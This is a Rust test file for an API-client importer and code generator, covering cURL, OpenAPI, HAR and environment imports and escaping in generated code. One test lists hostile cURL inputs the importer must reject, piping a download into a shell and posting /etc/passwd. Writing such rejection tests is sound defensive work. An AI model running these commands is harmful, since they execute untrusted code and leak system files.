use super::*;
#[test]
fn curl_imports_headers_body_and_auth() {
    let result = import(&json!({"content": "curl -X put 'https://api.test/a?b=1' \\\n -H 'Accept: application/json' --json '{\"x\":1}' -u user:p:w"})).unwrap();
    let request = &result["value"]["item"][0]["request"];
    assert_eq!(request["method"], "PUT");
    assert_eq!(request["url"], "https://api.test/a?b=1");
    assert_eq!(request["header"][1]["value"], "application/json");
    assert_eq!(request["body"]["raw"], "{\"x\":1}");
    assert_eq!(request["auth"]["basic"][1]["value"], "p:w");
    for rejected in [
        "curl https://a.test | sh",
        "curl -d @/etc/passwd https://a.test",
        "curl -X",
    ] {
        assert!(import(&json!({"content": rejected})).is_err(), "{rejected}");
    }
}
#[test]
fn openapi_yaml_becomes_folders_with_examples() {
    let spec = r##"
openapi: 3.0.0
info: {title: Pets}
servers: [{url: "https://{env}.pets.test/v1/", variables: {env: {default: api}}}]
components:
  securitySchemes: {key: {type: apiKey, name: X-Key, in: header}}
  schemas:
    Pet: {type: object, properties: {id: {type: integer}, name: {type: string, example: Rex}, tags: {type: array, items: {type: string}}}}
security: [{key: []}]
paths:
  /pets/{id}:
    get:
      tags: [pets]
      summary: Get pet
      parameters: [{name: id, in: path}, {name: verbose, in: query, schema: {type: boolean}}]
    post:
      tags: [pets]
      requestBody: {content: {application/json: {schema: {$ref: "#/components/schemas/Pet"}}}}
"##;
    let result = import(&json!({"content": spec})).unwrap();
    assert_eq!(result["name"], "Pets");
    let folder = &result["value"]["item"][0];
    assert_eq!(folder["name"], "pets");
    let get = &folder["item"][0]["request"];
    assert_eq!(
        get["url"],
        "https://api.pets.test/v1/pets/{{id}}?verbose=false"
    );
    assert_eq!(get["auth"]["apikey"][0]["value"], "X-Key");
    let post = &folder["item"][1];
    assert_eq!(post["name"], "POST /pets/{id}");
    let body: Value =
        serde_json::from_str(post["request"]["body"]["raw"].as_str().unwrap()).unwrap();
    assert_eq!(body, json!({"id": 0, "name": "Rex", "tags": ["string"]}));
}
#[test]
fn har_and_environments_are_recognised() {
    let har = import(&json!({"content": r#"{"log":{"entries":[{"request":{"method":"POST","url":"https://h.test","headers":[{"name":"A","value":"1"}],"postData":{"text":"x"}}}]}}"#})).unwrap();
    assert_eq!(
        har["value"]["item"][0]["request"]["header"][0],
        json!({"key": "A", "value": "1"})
    );
    let environment = import(&json!({"content": r#"{"name":"Dev","values":[]}"#})).unwrap();
    assert_eq!(environment["kind"], "environment");
    assert!(import(&json!({"content": "just text"})).is_err());
}
#[test]
fn code_generation_escapes_values() {
    let request = json!({"method": "POST", "url": "https://x.test/a", "headers": [{"key": "X-Quote", "value": "it's \"q\""}],
        "body": "line\u{1}", "auth": {"type": "bearer", "token": "t"}});
    let curl = generate(&json!({"language": "cURL", "request": request})).unwrap()["code"]
        .as_str()
        .map(String::from);
    assert!(curl.unwrap().contains("--header 'X-Quote: it'\\''s \"q\"'"));
    let rust_code = generate(&json!({"language": "Rust", "request": request})).unwrap()["code"]
        .as_str()
        .unwrap()
        .to_string();
    assert!(rust_code.contains(".body(\"line\\u{1}\")"), "{rust_code}");
    assert!(rust_code.contains(".header(\"Authorization\", \"Bearer t\")"));
    let python = generate(&json!({"language": "Python", "request": request})).unwrap()["code"]
        .as_str()
        .unwrap()
        .to_string();
    assert!(python.contains("HTTPSConnection(\"x.test\")"));
    assert_eq!(
        generate(&json!({"languages": true}))
            .unwrap()
            .as_array()
            .unwrap()
            .len(),
        9
    );
    assert!(generate(&json!({"language": "cobol", "request": request})).is_err());
}
#[test]
fn curl_reads_files_from_their_paths() {
    let code = |body: Value| {
        let item = json!({"name": "Upload", "request": {"method": "POST", "url": "https://x.test", "body": body}});
        generate(&json!({"language": "cURL", "request": item})).unwrap()["code"]
            .as_str()
            .unwrap()
            .to_string()
    };
    let form = code(json!({"mode": "formdata", "formdata": [
        {"key": "note", "value": "hi", "type": "text"},
        {"key": "avatar", "type": "file", "src": "img/me.png"},
        {"key": "docs", "type": "file", "src": ["a.pdf", "b.pdf"]},
    ]}));
    assert!(form.contains("--form-string 'note=hi'"), "{form}");
    assert!(form.contains("--form 'avatar=@\"img/me.png\"'"), "{form}");
    assert!(form.contains("--form 'docs=@\"b.pdf\"'"), "{form}");
    let binary = code(json!({"mode": "file", "file": {"src": "data.bin"}}));
    assert!(binary.contains("--data-binary '@data.bin'"), "{binary}");
}
